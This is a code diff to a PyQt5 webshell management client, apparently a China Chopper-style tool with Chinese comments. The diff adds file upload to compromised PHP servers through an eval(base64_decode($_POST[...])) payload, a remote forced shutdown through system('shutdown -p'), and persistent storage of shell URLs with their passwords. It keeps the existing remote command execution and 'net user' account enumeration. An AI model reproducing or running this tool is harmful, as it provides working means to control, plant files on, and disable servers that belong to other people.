@@ -3,6 +3,7 @@
 1.程序必须写大部分注释，一些基本语法除外
 2.命标准，eg:shu_ru_kuang or button
 
+shell分隔符为两个空格
 '''
 
 import base64
@@ -17,7 +18,7 @@ from PyQt5.uic import loadUi  # 需要导入的模块
 from PyQt5.QtWidgets import QApplication, QMainWindow, QMessageBox, QDialog, QWidget, QMenu, QFileDialog
 from PyQt5 import QtWidgets, QtCore, QtGui
 
-import sys
+import sys, os
 
 class Ui_form(QWidget):
     def __init__(self):
@@ -40,7 +41,10 @@ class php7(QMainWindow):
         self.wen_jian_guan_li_action.triggered.connect(self.show_wen_jian_guan_li)
         self.shell_guan_li_action.triggered.connect(self.show_shell_guan_li)
         self.cmd_action.triggered.connect(self.show_cmd)
-        self.cha_xun_users_action.triggered.connect(self.User)
+
+        '''快捷功能菜单栏调用函数部分'''
+        #self.cha_xun_users_action.triggered.connect(self.User)
+        self.shutdown_action.triggered.connect(self.Shutdown)
 
         self.listWidget.installEventFilter(self)  # 初始化QListView控件焦点事件
         self.treeWidget_2.installEventFilter(self)  # 初始化treeWidget_2控件焦点事件
@@ -57,6 +61,8 @@ class php7(QMainWindow):
         self.gif.start()
 
         self.setIcon()  #调用图标设置函数
+
+        self.readshellfile()  # 加载文件到listweight
 
         #self.eventFilter(GetForegroundWindow())
 
@@ -190,6 +196,7 @@ class php7(QMainWindow):
             box = QtWidgets.QMessageBox()
             box.information(self, "提示", "连接失败！")
             print("连接失败")
+
     '''删除shell'''
     def Delete_shell(self):
         button = QMessageBox.question(self, "警告！",
@@ -203,6 +210,33 @@ class php7(QMainWindow):
             self.listWidget.takeItem(shell)  # 删除listwidget中的数据
         else:
             return
+
+    '''保存shell'''
+    def closeEvent(self, event):
+        num = self.listWidget.count()  # 获取listweight行数
+        # print(num)
+        f = open("shell.txt", "w", encoding='utf-8')  # 打开文件
+        for i in range(0, num):
+            data = self.listWidget.item(i).text()  # 获取i行的数据
+            # print(data)
+            f.write(data + "\n")  # 写入文件
+        f.close()  # 关闭文件
+
+    '''打开软件时加载shell文件'''
+    def readshellfile(self):  # 读取shell文件
+
+        try:
+            with open("shell.txt", 'r', encoding='utf-8') as f:
+                # 打开文件
+                for each in f:  # 遍历文件
+                    each = each.replace('\n', '')
+                    # 替换换行符为空格
+                    if each != "                                  shell 地 址                                      密码":
+                        self.listWidget.addItem(each)
+                        # 添加到列表
+                f.close()  # 关闭文件
+        except:
+            pass
 
     '''文件管理部分'''
     def show_wen_jian_guan_li(self):#点击文件管理后展示文件管理内嵌窗口
@@ -234,7 +268,7 @@ class php7(QMainWindow):
         # 这里为了简单，将所有action与同一个处理函数相关联，
         # 当然也可以将他们分别与不同函数关联，实现不同的功能
         self.file_update.triggered.connect(self.File_update)
-        #self.file_upload.triggered.connect(self.File_upload)
+        self.file_upload.triggered.connect(self.File_upload)
         self.file_download.triggered.connect(self.File_download)
         #self.file_delete.triggered.connect(self.File_delete)
         #self.file_rename.triggered.connect(self.renameshow)
@@ -402,7 +436,7 @@ class php7(QMainWindow):
         data = {shell[1]: phpcode}
         #print(data)
         #print(self.filedir(shell,data))
-        return self.filedir(shell,data)  # 返回数据
+        return self.filedir(shell, data)  # 返回数据
 
     # sendcode函数是用来给发送的数据base64加密的函数
     def sendcode(self, phpcode):
@@ -421,6 +455,75 @@ class php7(QMainWindow):
             box = QtWidgets.QMessageBox()
             box.information(self, "提示", "请先连接shell！")
             #print("请先连接shell!")
+
+    '''文件上传'''
+    #文件上传打开对话框
+    def fileopen(self):
+        fileName, selectedFilter = QFileDialog.getOpenFileName(self, (r"上传文件"), (r"C:\windows"),
+                                                               r"All files(*.*);;Text Files (*.txt);;PHP Files (*.php);;ASP Files (*.asp);;JSP Files (*.jsp);;ASPX Files (*.aspx)")
+        return (fileName)  # 返回文件路径
+
+    #文件上传
+    def File_upload(self):
+        # 尝试获取文件路径
+        shell = self.shelllabel.text()  # 获取shell
+        if shell != "":
+            try:
+                fileName = self.fileopen()  # 调用文件打开对话框
+                # print(type(fileName))
+                # print(fileName)
+                try:
+                    # 尝试打开文件读取数据
+                    f = open(fileName, "rb")
+                    fsize = os.path.getsize(fileName)  # 获取文件大小
+                    print(111)
+                    filedata = f.read()
+                    shell = shell.split("  ")
+                    print(33)
+                    print(shell)
+                    f.close()
+                    # print(fsize)
+                    # print(filedata)
+                    # z2 = base64.b64encode(filedata)
+                    newfileName = fileName.split("/")
+                    # print(newfileName[-1])
+                    path = self.showfilepath() + "\\\\" + newfileName[-1]
+                    # print(path)
+                    # shell = self.Ui.shelllabel.text()  # 获取shell
+                    z = r"@eval(base64_decode($_POST[z0]));"  # 文件执行代码
+                    z0 = base64.b64encode((str(
+                        '$c=base64_decode($_POST["z2"]); echo(@fwrite(fopen("' + path + '","w"),$c));die();')).encode(
+                        'utf-8'))
+                    # z1 = base64.b64encode((str(path)).encode('utf-8')) # 文件路径加密
+                    # print(filedata)
+                    z2 = base64.b64encode(filedata)  # 文件数据加密
+                    # print(z0)
+                    # print(z1)
+                    # print(z2)
+                    data = {shell[1]: z, "z0": z0, "z2": z2}
+                    # print(data)
+                    result = self.filedir(shell, data)
+                    result = result.decode('utf-8', "ignore")
+                    # print(type(result))
+                    # print(result)#
+                    if int(result) == fsize:
+                        self.displayfile()  # 刷新显示
+                        box = QtWidgets.QMessageBox()
+                        box.information(self, "提示", "上传成功!\n上传路径: " + path)
+                    else:
+                        box = QtWidgets.QMessageBox()
+                        box.information(self, "提示", "上传失败!")
+                except:
+                    f.close()
+                    box = QtWidgets.QMessageBox()
+                    box.warning(self, "提示", "文件太大。上传失败！")
+            # 文件路径获取失败
+            except:
+                pass
+        else:
+            box = QtWidgets.QMessageBox()
+            # self.statusBar().showMessage(shell )  # 状态栏显示信息
+            box.information(self, "提示", "请先连接shell！")
 
     '''文件下载'''
     def File_download(self):
@@ -459,7 +562,7 @@ class php7(QMainWindow):
             box = QtWidgets.QMessageBox()
             box.information(self, "提示", "请先连接shell！")
 
-    '''文件保存对话框'''
+    '''文件下载保存对话框'''
 
     def filesave(self, filename):
         #print(filename)
@@ -480,7 +583,7 @@ class php7(QMainWindow):
 
     def Virtualshell(self):
         self.cmd_textEdit.setReadOnly(True)  # 设置textEdit不可编辑
-        self.cmd_textEdit.setText(r"C:\Users\admin> ")
+        self.cmd_textEdit.setText(r"E:\Phpstudy\phpstudy\WWW\word ")
     #虚拟终端执行按钮
     def shellcommand(self):
         self.cmd_textEdit.clear()
@@ -489,7 +592,8 @@ class php7(QMainWindow):
         #print(shellcommand)
         #print(shell)
         phpcode ="system('" + shellcommand + "');"
-        #print(phpcode)
+        #phpcode = shellcommand
+        print(phpcode)
         returncommand = self.sendcode(phpcode)
         #print(type(returncommand))
         #print(returncommand)
@@ -502,6 +606,7 @@ class php7(QMainWindow):
 
     '''快捷功能部分'''
 
+    '''查询用户'''
     def User(self):
         user = ""
         phpcode = 'system("net user");'
@@ -520,6 +625,34 @@ class php7(QMainWindow):
             box.about(self, "查询用户", user[:-1])
         else:
             pass
+    '''强制关机'''
+    def Shutdown(self):
+        shell = self.shelllabel.text()  # 获取shell
+        if shell != "":
+            button = QMessageBox.question(self, "警告！",
+                                          self.tr("你确定要强制关机吗？"),
+                                          QMessageBox.Ok | QMessageBox.Cancel,
+                                          QMessageBox.Ok)
+            if button == QMessageBox.Ok:
+                #shell = self.shelllabel.text()  # 获取shell
+                phpcode = 'system("shutdown -p");echo(ok);'
+                data = self.sendcode(phpcode)
+                print(data)
+                if data != None:
+                    if data == b"ok":
+                        box = QtWidgets.QMessageBox()
+                        box.information(self, "提示", "强制关机成功！")
+                    else:
+                        box = QtWidgets.QMessageBox()
+                        box.information(self, "提示", "强制关机失败！")
+                else:
+                    pass
+                # print(data)
+            else:
+                return
+        else:
+            box = QtWidgets.QMessageBox()
+            box.information(self, "提示", "请先连接shell！")
 
 if __name__ == '__main__':
     print("hello")
